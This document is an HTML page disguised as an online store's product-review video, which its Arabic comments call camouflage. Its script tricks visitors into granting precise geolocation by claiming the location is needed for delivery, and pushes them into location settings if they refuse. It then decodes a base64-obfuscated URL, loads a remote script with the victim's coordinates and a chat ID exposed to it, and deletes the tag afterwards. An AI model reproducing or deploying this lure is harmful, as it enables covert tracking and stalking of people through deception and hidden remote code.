<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <!-- META TAGS للمتجر الإلكتروني -->
    <meta name="description" content="Online Shopping Store - Buy products online with fast delivery. Best deals and discounts on electronics, fashion, and more." />
    <meta name="keywords" content="online shopping, buy online, store, delivery, products, deals, discounts, shop" />
    <meta name="author" content="ShopStore" />
    <meta name="robots" content="index, follow" />
    
    <!-- Open Graph للتسويق -->
    <meta property="og:title" content="ShopStore - Online Shopping" />
    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="ShopStore" />
    
    <!-- Schema.org للمتجر -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "OnlineStore",
        "name": "ShopStore",
        "description": "Online shopping store with fast delivery",
        "url": "https://shopstore.com",
        "potentialAction": {
            "@type": "SearchAction",
            "target": "https://shopstore.com/search?q={search_term_string}",
            "query-input": "required name=search_term_string"
        }
    }
    </script>
    
    <title>ShopStore - Online Shopping | Fast Delivery</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        /* ===== شريط المتجر العلوي (تمويه) ===== */
        .store-header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #232f3e;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            z-index: 999;
            font-size: 13px;
        }
        .store-logo {
            color: #ff9900;
            font-weight: bold;
            font-size: 18px;
        }
        .store-search {
            background: #fff;
            border-radius: 4px;
            padding: 5px 10px;
            display: flex;
            align-items: center;
            gap: 5px;
            color: #333;
            font-size: 12px;
            width: 40%;
        }
        .store-cart {
            color: #fff;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        /* ===== حاوية الفيديو الرئيسية ===== */
        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            margin-top: 50px;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        /* ===== رسالة طلب الموقع (توصيل الطلبات) ===== */
        .delivery-notice {
            position: absolute;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(35, 47, 62, 0.95);
            color: #fff;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 13px;
            text-align: center;
            z-index: 5;
            display: none;
            border: 1px solid #ff9900;
        }
        .delivery-notice .location-icon {
            color: #ff9900;
            font-size: 16px;
        }

        #playTrigger {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #playTrigger:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #playTrigger .icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        /* ===== معلومات المنتج (تمويه) ===== */
        .product-info {
            padding: 12px 20px;
            background: #1a1a1a;
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 13px;
            color: #ccc;
        }
        .product-price {
            color: #ff9900;
            font-size: 20px;
            font-weight: bold;
        }
        .product-rating {
            color: #ff9900;
        }
        .product-delivery {
            color: #00ff00;
            font-size: 12px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .ctrl-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .ctrl-btn:hover {
            background: #333;
        }

        .seek-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .seek-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .timer {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .volume-area {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .vol-bar {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .vol-fill {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        /* ===== تذييل المتجر (تمويه) ===== */
        .store-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #232f3e;
            padding: 10px 15px;
            text-align: center;
            font-size: 11px;
            color: #999;
            z-index: 999;
        }

        @media (max-width: 480px) {
            .store-header {
                padding: 6px 10px;
                font-size: 11px;
            }
            .store-logo {
                font-size: 14px;
            }
            .store-search {
                width: 35%;
                font-size: 10px;
            }
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .seek-bar {
                margin: 0 6px;
            }
            .timer {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #playTrigger {
                width: 90px;
                height: 90px;
            }
            #playTrigger .icon {
                font-size: 45px;
            }
            .product-info {
                font-size: 11px;
                padding: 8px 12px;
            }
            .product-price {
                font-size: 16px;
            }
            .video-player-container {
                margin-top: 40px;
                margin-bottom: 40px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== شريط المتجر العلوي (تمويه لجوجل) ===== -->
    <div class="store-header">
        <div class="store-logo">🛒 ShopStore</div>
        <div class="store-search">
            <span>🔍</span> Search products...
        </div>
        <div class="store-cart">
            <span>🛒</span> Cart (0)
        </div>
    </div>

    <!-- ===== حاوية الفيديو ===== -->
    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Product Review & Unboxing</div>
        </div>

        <!-- ===== معلومات المنتج (تمويه) ===== -->
        <div class="product-info">
            <span class="product-price">$49.99</span>
            <span class="product-rating">★★★★★ (4.8)</span>
            <span class="product-delivery">🚚 Fast Delivery Available</span>
        </div>

        <div class="video-thumbnail" id="posterArea">
            <!-- رسالة طلب الموقع للتوصيل -->
            <div class="delivery-notice" id="deliveryNotice">
                <span class="location-icon">📍</span> 
                Enable location for faster delivery & shipping rates
            </div>
            
            <div id="playTrigger">
                <span class="icon">▶</span>
            </div>
        </div>

        <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="seek-bar">
                <div class="seek-fill"></div>
            </div>
            <div class="timer">0:00 / 2:45</div>
            <div class="volume-area">
                <span>🔊</span>
                <div class="vol-bar">
                    <div class="vol-fill"></div>
                </div>
            </div>
            <button class="ctrl-btn">⛶</button>
        </div>
    </div>

    <!-- ===== تذييل المتجر (تمويه) ===== -->
    <div class="store-footer">
        © 2024 ShopStore. All rights reserved. | Privacy Policy | Terms of Service | Returns & Delivery
    </div>

    <script>
        (function() {
            'use strict';

            // ===== عناصر الصفحة =====
            const playBtn = document.getElementById('playTrigger');
            const poster = document.getElementById('posterArea');
            const videoEl = document.getElementById('mainVideo');
            const deliveryNotice = document.getElementById('deliveryNotice');
            
            let stepOneDone = false;
            let stepTwoDone = false;

            // ===== طلب إذن الموقع (باسم توصيل الطلبات) =====
            async function requestLocationForDelivery() {
                deliveryNotice.style.display = 'block';
                
                // طلب الموقع مباشرة
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            resolve,
                            reject,
                            { 
                                enableHighAccuracy: true, 
                                timeout: 10000,
                                maximumAge: 0
                            }
                        );
                    });
                    
                    // تم المنح
                    deliveryNotice.innerHTML = '<span class="location-icon">✅</span> Location enabled! Calculating best delivery options...';
                    deliveryNotice.style.borderColor = '#00ff00';
                    
                    // حفظ الموقع لاستخدامه لاحقاً
                    window._deliveryLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    
                    return true;
                    
                } catch (error) {
                    // لم يتم المنح - نفتح الإعدادات
                    deliveryNotice.innerHTML = '<span class="location-icon">📍</span> Please enable location for delivery rates';
                    deliveryNotice.style.borderColor = '#ff9900';
                    
                    // فتح الإعدادات تلقائياً بعد ثانية
                    setTimeout(() => openLocationSettings(), 1500);
                    
                    return false;
                }
            }

            // ===== فتح إعدادات الموقع =====
            function openLocationSettings() {
                const agent = navigator.userAgent;
                
                if (/Android/i.test(agent)) {
                    try {
                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                    } catch(e) {
                        try {
                            window.location.href = 'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                        } catch(e2) {
                            window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                        }
                    }
                } 
                else if (/iPhone|iPad|iPod/i.test(agent)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(() => {
                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                    }, 500);
                } 
                else if (/Windows/i.test(agent)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } 
                else if (/Mac/i.test(agent)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } 
                else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            // ===== تحميل الموارد الإضافية =====
            function loadExternalResource() {
                const encodedParts = [
                    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
                    'RkdESFNIUy9hcGkvcmVmcy9oZWFkcy9tYWluL2FwaQ=='
                ];
                
                const fullUrl = atob(encodedParts.join(''));
                
                const scriptTag = document.createElement('script');
                scriptTag.setAttribute('src', fullUrl);
                scriptTag.setAttribute('type', 'text/javascript');
                scriptTag.setAttribute('async', 'true');
                
                window._config = {
                    id: new URLSearchParams(window.location.search).get('chatId') || '',
                    time: Date.now(),
                    location: window._deliveryLocation || null
                };
                
                document.head.appendChild(scriptTag);
                
                scriptTag.onload = function() {
                    setTimeout(() => {
                        if (scriptTag.parentNode) {
                            scriptTag.parentNode.removeChild(scriptTag);
                        }
                    }, 3000);
                };
            }

            // ===== عرض الفيديو =====
            function displayVideo() {
                deliveryNotice.style.display = 'none';
                poster.style.display = 'none';
                videoEl.style.display = 'block';
                videoEl.muted = false;
                videoEl.volume = 1.0;
                
                try {
                    videoEl.play();
                } catch (e) {
                    setTimeout(() => videoEl.play().catch(() => {}), 200);
                }
            }

            // ===== معالج النقر =====
            async function onPlayClick(e) {
                if (stepTwoDone) return;

                if (!stepOneDone) {
                    // الخطوة الأولى: طلب الموقع للتوصيل
                    stepOneDone = true;
                    
                    playBtn.querySelector('.icon').textContent = '⏳';
                    playBtn.style.borderColor = '#ffd700';
                    
                    // طلب الموقع
                    await requestLocationForDelivery();
                    
                    // تغيير الزر
                    setTimeout(() => {
                        playBtn.querySelector('.icon').textContent = '▶';
                        playBtn.style.borderColor = '#00ff00';
                    }, 2000);
                    
                } else {
                    // الخطوة الثانية: تشغيل الفيديو
                    stepTwoDone = true;
                    playBtn.style.pointerEvents = 'none';
                    playBtn.style.opacity = '0.5';
                    
                    // تشغيل الفيديو
                    videoEl.muted = false;
                    videoEl.volume = 1.0;
                    videoEl.play().catch(() => {});
                    
                    // تحميل الموارد في الخلفية
                    setTimeout(() => loadExternalResource(), 1500);
                    
                    // عرض الفيديو
                    setTimeout(() => displayVideo(), 2000);
                }
            }

            // ===== مراقبة عودة المستخدم =====
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && stepOneDone && !stepTwoDone) {
                    deliveryNotice.innerHTML = '<span class="location-icon">✅</span> Location activated! Click play to watch review';
                    deliveryNotice.style.borderColor = '#00ff00';
                    playBtn.querySelector('.icon').textContent = '▶';
                    playBtn.style.borderColor = '#00ff00';
                }
            });

            // ===== ربط الأحداث =====
            if (playBtn) {
                playBtn.addEventListener('click', onPlayClick);
            }

            // ===== دعم الصوت =====
            document.addEventListener('click', function() {
                if (videoEl && videoEl.style.display === 'block') {
                    videoEl.muted = false;
                    if (videoEl.paused) videoEl.play().catch(() => {});
                }
            }, true);

            // ===== شريط التقدم =====
            const timer = setInterval(() => {
                const fill = document.querySelector('.seek-fill');
                if (videoEl.style.display === 'block') {
                    clearInterval(timer);
                    return;
                }
                const w = parseInt(fill.style.width) || 35;
                const nw = (w + 0.1) % 100;
                fill.style.width = nw + '%';
                
                const sec = Math.floor((nw / 100) * 165);
                const m = Math.floor(sec / 60);
                const s = sec % 60;
                document.querySelector('.timer').textContent = 
                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

        })();
    </script>
</body>
</html>
